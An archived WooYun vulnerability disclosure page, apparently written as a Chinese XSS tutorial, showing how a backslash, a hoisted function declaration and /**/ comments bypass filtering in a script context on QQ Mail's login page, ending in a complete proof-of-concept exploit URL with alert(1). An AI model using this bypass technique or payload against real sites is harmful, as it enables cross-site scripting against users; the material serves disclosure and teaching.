@@ -1,0 +1,338 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 5. 反斜线复仇记  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 5. 反斜线复仇记  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-13 21:55</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-06：	细节向普通白帽子公开<br/>
+									2013-01-16：	细节向实习白帽子公开<br/>
+									2013-01-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">还是在&lt;script&gt;之间的场景，某些情况下，我们仅仅需要的只是一个反斜线，就可以绕过过滤了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 有以下实例点。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=aaa&amp;from=bbb&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+对应的输出，如下图所示：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/131935081b49f955e15c9c4cf9b386052c44efec.jpg" target="_blank"><img src="../images/131935081b49f955e15c9c4cf9b386052c44efec.jpg" alt="17.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+经过测试，我们可以看到，双引号是用不了， 但是 反斜线还可以使用。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1319354861f6e9fcec95b51f91233a04d3e47056.jpg" target="_blank"><img src="../images/1319354861f6e9fcec95b51f91233a04d3e47056.jpg" alt="18.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+那么这里是否可以成功的XSS呢？ 我们把缺陷代码部分提取出来。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script&gt;getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;+&quot;&amp;t=&quot;+&quot;&amp;alias=&quot;+&quot;&amp;regalias=&quot;+&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title=&quot;+&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;+&quot;&amp;org_fun=&quot;+&quot;&amp;aliastype=&quot;+&quot;&amp;ss=aaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;+&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;+&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;+&quot;&amp;ppp=&quot;+&quot;&amp;secpp=&quot;&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 可以看到有缺陷的部分是<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;//后面省略。</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们可以控制的是 aaaa ，又不能用&quot;，怎么办呢？<br />
+<br />
+<br />
+<br />
+因为我们可以使用 \，那么我们可以杀掉 aaaa 后面的 双引号。<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=bbb&quot;+&quot;&amp;param=&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到代码的结果因为一个反斜线发生了变化，如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/131945143a1a6ebfa1fe861100de697e8a9421cc.jpg" target="_blank"><img src="../images/131945143a1a6ebfa1fe861100de697e8a9421cc.jpg" alt="19.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+为了保证 bbb 后面的语法正确性，我们把bbb改为一个数字，把bbb后面加上 // 来注释掉后面的部分。变成以下形式。<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=1//&quot;+&quot;&amp;param=&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+3. 看起来不错哦，但是会出来一些问题，&quot;字符串&quot;&amp;from=1，这样是错误的，因为&amp;符号的优先级高， (&quot;字符串&quot;&amp;from)=1 是无法进行这种赋值操作的。这样一来还是不行。别着急。我们可以稍微改动一下。变为以下形式。<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1//&quot;+&quot;&amp;param=&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+由于==的优先级比 &amp; 高，所以语句相当于 (&quot;字符串&quot;)&amp;(from==1)<br />
+<br />
+<br />
+<br />
+4. 更顺眼了，但是还是会悲剧啊。由于from未定义，直接和1进行相等判断的话，会报错，错误是：“from”未定义。。。怎么办呢？<br />
+<br />
+<br />
+<br />
+5. 别紧张，javascript里有一个特性。 如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>aaa();<br />
+<br />
+function aaa(){<br />
+  <br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。换句话说：<br />
+<br />
+<br />
+<br />
+解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是：<br />
+<br />
+<br />
+<br />
+</p><pre><code>function aaa(){<br />
+<br />
+}<br />
+<br />
+aaa();</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+利用这样一个特性，我们的代码可以改改。<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function from(){}//&quot;+&quot;&amp;param=&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这样一来，我们的 function from(){} 就会被提前解析，从而定义了from, 后面 from==1的时候，就不会报错啦～～<br />
+<br />
+<br />
+<br />
+6. 故事往往是曲折的，到了这一步，我们会发现还是不行。<br />
+<br />
+<br />
+<br />
+看一看源代码吧～～ ，哎，我们的空格被转义为了 &amp;nbsp; <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/132044290631ee315a2a34d1244d46dd676229ce.jpg" target="_blank"><img src="../images/132044290631ee315a2a34d1244d46dd676229ce.jpg" alt="20.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 当然，这么一点小事情，难不到我们的，我们用注释符来做分隔符。 /**/替换空格，有没有觉得和 sql注入一样了，咔咔。<br />
+<br />
+<br />
+<br />
+于是，我们的代码变为了：<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function/**/from(){}//&quot;+&quot;&amp;param=&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+8. 嗯，这次没有语法错误了，我们插入我们自己的JS代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from(){}//&quot;+&quot;&amp;param=&quot;;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+最终的利用代码如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=\&amp;from==0;alert(1);function/**/from(){};//&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+----------------------------<br />
+<br />
+<br />
+<br />
+恩，这次是我们的 反斜线为 双引号报仇啦！<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/13204830517ceba87c9470e6107e625dcb12a614.jpg" target="_blank"><img src="../images/13204830517ceba87c9470e6107e625dcb12a614.jpg" alt="21.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+只有在不登录QQ邮箱的情况下触发，比较鸡肋，实际意义不大，仅供研究。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 随便修修就好。<br />
+<br />
+2. 某些情况下，\ 还是很危险的。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015979" title="[腾讯实例教程] 那些年我们一起学XSS - 5. 反斜线复仇记">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-17 14:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15979";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
